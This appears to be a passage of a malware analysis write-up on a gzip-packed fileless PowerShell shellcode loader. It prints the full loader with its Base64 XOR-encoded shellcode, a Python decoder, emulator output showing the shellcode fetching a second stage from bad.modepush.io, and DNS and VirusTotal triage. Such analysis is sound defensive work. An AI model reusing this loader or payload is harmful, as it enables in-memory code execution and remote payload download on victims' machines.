000006b0: 4ba5 62d2 2b7c bc79 bd3d bd5d 7bbb 8ff9  K.b.+|.y.=.]{...
000006c0: 9d71 026d b55a 2b29 78e9 ab43 d200 fe5b  .q.m.Z+)x..C...[
000006d0: 9b25 eb41 68e9 0e94 3fe8 7aae 77d6 8004  .%.Ah...?.z.w...
000006e0: 834b efa2 103b 9128 147e de6e ef70 e061  .K...;.(.~.n.p.a
000006f0: 075a 5168 56af 959e 751c 8292 6eeb 176d  .ZQhV...u...n..m
00000700: 0ff4 7e59 47f6 0637 da1c 868d fa4f 4745  ..~YG..7.....OGE
00000710: e8c2 2f1b a1c5 ca62 32a2 f53a ed48 2e11  ../....b2..:.H..
00000720: 5e1b b3eb c6c7 c717 08ef 72b1 a428 3e61  ^.........r..(>a
00000730: 6f43 ad32 533d 35aa 5568 a7aa a766 b598  oC.2S=5.Uh...f..
00000740: fb7d 5878 e2c7 59bb 97a8 03f9 8bf2 cc93  .}Xx..Y.........
00000750: cf96 9cd4 121c 6b76 cf45 9efb f99e f9af  ......kv.E......
00000760: 07f0 9dd1 7f87 3601 2f6d ea3e a04b 1dfa  ......6./m.>.K..
00000770: 395e c55c fe6b 2e27 aeff 01fc f131 b4cf  9^.\.k.'.....1..
00000780: f0c9 82f7 4c37 255f 48f5 80de 6d89 01df  ....L7%_H...m...
00000790: 37e9 855d b8d5 8b8c d8d7 985b 9df9 c6dc  7..].......[....
000007a0: 4178 6cd8 a8c3 474e b089 92db 9bc9 bed9  Axl...GN........
000007b0: fe62 8eba 9d09 fec5 4c31 c2d0 73df 8d88  .b......L1..s...
000007c0: 012c c5d0 8425 aa53 25c9 e6dc b7dc df0a  .,...%.S%.......
000007d0: 38b5 2e04 0e00 00                        8......
```

`1f 8b 08 00` are the magic bytes for a GZIP-compressed stream. Rename output with .gz extension and decompress it.

`gunzip infected.gz`

#### GZIP Decompression
<pre style="white-space: pre-wrap; word-break: break-word;">
Set-StrictMode -Version 2

$DoIt = @'
function func_get_proc_address {
    Param ($var_module, $var_procedure)

    $var_unsafe_native_methods =
        ([AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object {
            $_.GlobalAssemblyCache -And
            $_.Location.Split('\\')[-1].Equals('System.dll')
        }).GetType('Microsoft.Win32.UnsafeNativeMethods')

    $var_gpa = $var_unsafe_native_methods.GetMethod(
        'GetProcAddress',
        [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string')
    )

    return $var_gpa.Invoke(
        $null,
        @(
            [System.Runtime.InteropServices.HandleRef](
                New-Object System.Runtime.InteropServices.HandleRef(
                    (New-Object IntPtr),
                    ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module))
                )
            ),
            $var_procedure
        )
    )
}

function func_get_delegate_type {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [Type[]] $var_parameters,

        [Parameter(Position = 1)]
        [Type] $var_return_type = [Void]
    )

    $var_type_builder =
        [AppDomain]::CurrentDomain
            .DefineDynamicAssembly(
                (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
                [System.Reflection.Emit.AssemblyBuilderAccess]::Run
            )
            .DefineDynamicModule('InMemoryModule', $false)
            .DefineType(
                'MyDelegateType',
                'Class, Public, Sealed, AnsiClass, AutoClass',
                [System.MulticastDelegate]
            )

    $var_type_builder.DefineConstructor(
        'RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard,
        $var_parameters
    ).SetImplementationFlags('Runtime, Managed')

    $var_type_builder.DefineMethod(
        'Invoke',
        'Public, HideBySig, NewSlot, Virtual',
        $var_return_type,
        $var_parameters
    ).SetImplementationFlags('Runtime, Managed')

    return $var_type_builder.CreateType()
}

[Byte[]]$var_code =   [System.Convert]::FromBase64String('j5v6c3NzE/qWQqEX+CFD+CF/+CFn+AFbfMQ5VUKMQrPfTxIPcV9Tsrx+crSRgyEk+CFj+DFPcqP4Mwv2swc5cqMj+Dtr+CtTcqCQTzr4R/hypUKMQrPfsrx+crRLkwaHcA6LSA5XBpEr+CtXcqAV+H84+CtvcqD4d/hyo/o3V1coKBIqKSKMkyssKfhhmPUuGx0WB3MbBBodGicbPwRVdIymm3Nzc3NCjCQkJCQkG0klCtSMpprXc3NzKEK6IiIZcCIiG8hyc3MgIxsk+uy1jKYjmv9zc3MoQqEhG3NBs/chISEgISMbmCZdSIym+rXwsCMb80Bzc/qTGXcjGWwlGwY17fWMpixCjCQkGYwgJRtedWsIjKb2s3z3uXJzc0KM9oUHd/qKmHob2baRLoym+rIbNlItQoymQowkGXQiJSMbxCSTeIymzHNcc3NKtAZ0KyOaCIyMjEKMmuJyc3OaunJzc5scjIyMXDYpJBVzGBx4JNhU8MLH0/Wp+2OXxwjehevWqQvSuus5ztGohvhmqDMjJsBmHYVH8gGu5M+2AL7pP3vvJ0+dD8r85BkvhKn5Cbo1axeU/XMmABYBXjIUFh0HSVM+HAkaHx8SXEZdQ1NbEBweAxIHGhEfFkhTPiA6NlNKXUNIUyQaHRccBABTPSdTRV1CSFMnARoXFh0HXEZdQ0hTMTw6NkpIIycxIVp+eXOoBsvVGP6BY/ZI8BXwtIOqG4lTF36/h781uSuKLclWo9E6yUvNEINXZQfUY4XfXRqfS2AXioYJ9JlK4i7/SBr5ZsVE3ngyEilNsbp/d8VgZIXR5ScGVkIrcXKaNv7QkdM4W7Ck1eiRl5nilbR1vpit1bdbhPlZ6R32P7kT1KWwB7RfTezdm0hGiOBNSSLcSmBgFGIPTpoDLsnjPWez9DbJ/bEk7imeyKV7W7R4MvMcBoV1wtQjrKY1bWXJqwebG/P7KlZDJDy6QAu2IBsUiqwOI+rx5TJzG4PG0SWMphkzG3Njc3Mbc3MzcyQbK9cgloym4Mpzc3NzcqoiIPqUJBtzU3NzICUbYeX6kYym9rMHtfh0crD2swaWK7Cb+o6MjBESF10eHBcWAwYAG10aHHNzc3Nw')

for ($x = 0; $x -lt $var_code.Count; $x++) {
    $var_code[$x] = $var_code[$x] -bxor 115
}

$var_va =
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (func_get_proc_address kernel32.dll VirtualAlloc),
        (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
    )

$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)

[System.Runtime.InteropServices.Marshal]::Copy(
    $var_code,
    0,
    $var_buffer,
    $var_code.length
)

$var_runme =
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        $var_buffer,
        (func_get_delegate_type @([IntPtr]) ([Void]))
    )

$var_runme.Invoke([IntPtr]::Zero)
'@

If ([IntPtr]::size -eq 8) {
    start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
}
else {
    IEX $DoIt
} 
}
</pre>

#### PowerShell Shellcode Loader Analysis

This script is a **fileless PowerShell shellcode loader** that dynamically resolves Windows APIs, allocates executable memory, and executes a decrypted payload in memory.

---

##### API Resolution & Function Preparation

- **`func_get_proc_address kernel32.dll VirtualAlloc`**  
  Resolves the memory address of the `VirtualAlloc` Windows API at runtime.

- **`func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])`**  
  Creates a delegate (function signature) that matches `VirtualAlloc`, allowing it to be called from PowerShell.

---

##### Shellcode Preparation

- **`$var_code`**  
  Stores the Base64-encoded and XOR-encrypted shellcode.

- **`$var_code[$x] = $var_code[$x] -bxor 115`**  
  Decrypts the shellcode using XOR with key `115`.

---

##### Memory Allocation & Injection

- **`$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)`**  
  Calls `VirtualAlloc` to allocate memory.
  - `0x40` → Read/Write/Execute (RWX)

- **`[System.Runtime.InteropServices.Marshal]::Copy(...)`**  
  Copies the decrypted shellcode into the allocated memory.

---

##### Execution

- **`GetDelegateForFunctionPointer($var_buffer, ...)`**  
  Treats the allocated memory (containing shellcode) as a callable function.

- **`$var_runme.Invoke([IntPtr]::Zero)`**  
  Executes the shellcode.

---

##### Architecture Handling

- **`start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt`**  
  Launches a 32-bit PowerShell instance to ensure compatibility with x86 shell code and executed $DoIt payload.

---


#### Shell Code XOR Decryption
```
import base64

data = "j5v6c3NzE/qWQqEX+CFD+CF/+CFn+AFbfMQ5VUKMQrPfTxIPcV9Tsrx+crSRgyEk+CFj+DFPcqP4Mwv2swc5cqMj+Dtr+CtTcqCQTzr4R/hypUKMQrPfsrx+crRLkwaHcA6LSA5XBpEr+CtXcqAV+H84+CtvcqD4d/hyo/o3V1coKBIqKSKMkyssKfhhmPUuGx0WB3MbBBodGicbPwRVdIymm3Nzc3NCjCQkJCQkG0klCtSMpprXc3NzKEK6IiIZcCIiG8hyc3MgIxsk+uy1jKYjmv9zc3MoQqEhG3NBs/chISEgISMbmCZdSIym+rXwsCMb80Bzc/qTGXcjGWwlGwY17fWMpixCjCQkGYwgJRtedWsIjKb2s3z3uXJzc0KM9oUHd/qKmHob2baRLoym+rIbNlItQoymQowkGXQiJSMbxCSTeIymzHNcc3NKtAZ0KyOaCIyMjEKMmuJyc3OaunJzc5scjIyMXDYpJBVzGBx4JNhU8MLH0/Wp+2OXxwjehevWqQvSuus5ztGohvhmqDMjJsBmHYVH8gGu5M+2AL7pP3vvJ0+dD8r85BkvhKn5Cbo1axeU/XMmABYBXjIUFh0HSVM+HAkaHx8SXEZdQ1NbEBweAxIHGhEfFkhTPiA6NlNKXUNIUyQaHRccBABTPSdTRV1CSFMnARoXFh0HXEZdQ0hTMTw6NkpIIycxIVp+eXOoBsvVGP6BY/ZI8BXwtIOqG4lTF36/h781uSuKLclWo9E6yUvNEINXZQfUY4XfXRqfS2AXioYJ9JlK4i7/SBr5ZsVE3ngyEilNsbp/d8VgZIXR5ScGVkIrcXKaNv7QkdM4W7Ck1eiRl5nilbR1vpit1bdbhPlZ6R32P7kT1KWwB7RfTezdm0hGiOBNSSLcSmBgFGIPTpoDLsnjPWez9DbJ/bEk7imeyKV7W7R4MvMcBoV1wtQjrKY1bWXJqwebG/P7KlZDJDy6QAu2IBsUiqwOI+rx5TJzG4PG0SWMphkzG3Njc3Mbc3MzcyQbK9cgloym4Mpzc3NzcqoiIPqUJBtzU3NzICUbYeX6kYym9rMHtfh0crD2swaWK7Cb+o6MjBESF10eHBcWAwYAG10aHHNzc3Nw"

decoded = base64.b64decode(data)
shellcode = bytes([b ^ 115 for b in decoded])

# save to file
with open("shellcode.bin", "wb") as f:
    f.write(shellcode)
```

#### Shell Code Debugging
```
scdbg.exe -f shellcode.bin -u                                    

Loaded 345 bytes from file shellcode.bin                                                                               
Initialization Complete..                                                                                               
Max Steps: -1                                                                                                           
Using base offset: 0x401000                                                                                                                                                                                                                     

4010a2  LoadLibraryA(wininet)                                                                                           
4010b5  InternetOpenA()                                                                                                  
4010d1  InternetConnectA(server: bad.modepush.io, port: 443, )                                                          
4010ed  HttpOpenRequestA(path: /EZWf, )                                                                                  
401106  InternetSetOptionA(h=4893, opt=1f, buf=12fdec, blen=4)                                                          
401116  HttpSendRequestA(User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;PTBR), )     
401138  GetDesktopWindow()                                                                                               
401147  InternetErrorDlg(11223344, 4893, 401138, 7, 0)                                                                  
401303  VirtualAlloc(base=0 , sz=400000) = 600000                                                                       
40131e  InternetReadFile(4893, buf: 600000, size: 2000)
```

#### Shell Code Debugging Analysis

##### Network Setup

- **`LoadLibraryA(wininet)`**  
  Loads the Windows WinINet library used for HTTP/HTTPS communication.

- **`InternetOpenA()`**  
  Initializes an internet session.

- **`InternetConnectA(server: bad.modepush.io, port: 443)`**  
  Establishes a connection to the remote server over port 443.

- **`HttpOpenRequestA(path: /EZWf)`**  
  Creates an HTTP request for the specified path `/EZWf`.

- **`InternetSetOptionA(h=4893, opt=1f, buf=12fdec, blen=4)`**  
  Configures options for the internet connection.

- **`HttpSendRequestA(User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;PTBR))`**  
  Mimics a legitimate Internet Explorer user agent to blend in with normal traffic.
---

##### Error Handling

- **`GetDesktopWindow()`**  
  Retrieves a handle to the desktop window.

- **`InternetErrorDlg(11223344, 4893, 401138, 7, 0)`**  
  Handles or suppresses HTTPS certificate warnings, allowing the connection to proceed in event of certificate issue.
---

##### Second Stage Payload Retrieval

- **`VirtualAlloc(base=0 , sz=400000) = 600000`**  
  Allocates ~4 MB of memory at address `0x600000` to store the incoming second-stage payload.

- **`InternetReadFile(4893, buf: 600000, size: 2000)`**  
  Reads data from the remote server into the allocated memory buffer in ~2 MB chunks.
---

#### Additional Analysis

##### URL Triage
```
curl -v https://bad.modepush.io/EZWf
* Could not resolve host: bad.modepush.io
* Closing connection
curl: (6) Could not resolve host: bad.modepush.io
```
---
##### DNS Lookup
```
dig bad.modepush.io

; <<>> DiG 9.10.6 <<>> bad.modepush.io
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 30234
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;bad.modepush.io.		IN	A

;; AUTHORITY SECTION:
modepush.io.		3601	IN	SOA	dns1.registrar-servers.com. hostmaster.registrar-servers.com. 1739527939 43200 3600 604800 3601
```
---
##### Virus Total Domain Check
```
vt domain bad.modepush.io | grep last_analysis -A10
  last_analysis_date: 1775170481  # 2026-04-02 17:54:41 -0500 CDT
  last_analysis_results: 
    "0xSI_f33d": 
      category: "undetected"
      engine_name: "0xSI_f33d"
      method: "blacklist"
      result: "unrated"
    ADMINUSLabs: 
      category: "harmless"
      engine_name: "ADMINUSLabs"
      method: "blacklist"
      result: "clean"
--
  last_analysis_stats: 
    harmless: 58
    malicious: 0
    suspicious: 0
    timeout: 0
    undetected: 36
  last_dns_records: []
  last_modification_date: 1775173962  # 2026-04-02 18:52:42 -0500 CDT
  last_update_date: 1710144737  # 2024-03-11 03:12:17 -0500 CDT
  popularity_ranks: 
  registrar: "NAMECHEAP INC"
```
---
##### Shell Code MD5 Hash
```
md5sum shellcode.bin
a1d038b42017efef477271b46d03835a  shellcode.bin
```
---
##### Virus Total Hash Check
```
vt file a1d038b42017efef477271b46d03835a | grep last_analysis_stats -A33
  last_analysis_stats: 
    confirmed-timeout: 0
    failure: 0
    harmless: 0
    malicious: 27
    suspicious: 0
    timeout: 0
    type-unsupported: 14
    undetected: 34
  last_modification_date: 1774804082  # 2026-03-29 12:08:02 -0500 CDT
  last_submission_date: 1774804081  # 2026-03-29 12:08:01 -0500 CDT
  magic: "data"
  magika: "UNKNOWN"
  md5: "a1d038b42017efef477271b46d03835a"
  meaningful_name: "decoded.bin"
  names: 
  - "decoded.bin"
  - "download.dat"
  - "download (1).dat"
  - "shellcode.bin"
  - "ShellcodeFinal"
  - "download.bin"
  popular_threat_classification: 
    popular_threat_category: 
    - count: 7
      value: "trojan"
    popular_threat_name: 
    - count: 12
      value: "shellcode"
    - count: 9
      value: "marte"
    - count: 2
      value: "bcpe"
    suggested_threat_label: "trojan.shellcode/marte"
```
---
#### Conclusion

The PowerShell script and embedded shellcode function as a first-stage loader. Powershell is responsible for decoding and executing the shell code in memory, while the shell code performs network-based retrieval of a second-stage payload from `bad.modepush.io`. The shell code is confirmed malicious and is classified by VirusTotal as `trojan.shellcode/marte`. However, the referenced domain is currently inactive (NXDOMAIN), preventing retrieval of the second-stage payload during analysis.
